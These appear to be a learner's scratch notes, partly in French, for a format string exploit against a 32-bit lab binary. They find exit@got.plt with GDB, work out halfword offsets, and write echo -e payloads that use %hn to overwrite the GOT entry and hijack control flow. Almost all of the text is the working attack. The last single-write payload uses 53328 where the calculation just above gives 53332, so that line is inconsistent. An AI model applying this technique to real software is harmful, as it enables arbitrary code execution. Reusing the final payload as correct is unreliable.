...
buf 0xffffd698
0x080484cb <+135>:   addl   $0x1,0x8c(%esp)		; 0xffffd6fc

//////////////////////////////////////////////////////////
x/a 0x80497e0
0x80497e0 <exit@got.plt>:       0x8048376 <exit@plt+6>

override du exit:
08048370 <exit@plt>:
 8048370:       ff 25 e0 97 04 08       jmp    *0x80497e0

0xffffd058	4294955096
0xffff	d058
65535	53336

0x80497e0 + 0		53336 - 8 = 53328
0x80497e0 + 2		65535 - 53336 = 12199
11112222%5x%10$p%5x%11$p
1111%5x%10$p 
\xe0\x97\x04\x08\xe2\x97\x04\x08%53328x%10$hn%12199x%11$hn
echo -e -n "\xe0\x97\x04\x08\xe2\x97\x04\x08%53328x%10\$hn%12199x%11\$hn"

0x80497e0		53336 - 4 = 53332
\xe0\x97\x04\x08%53332x%10$hn
echo -e -n "\xe0\x97\x04\x08%53328x%10\$hn"
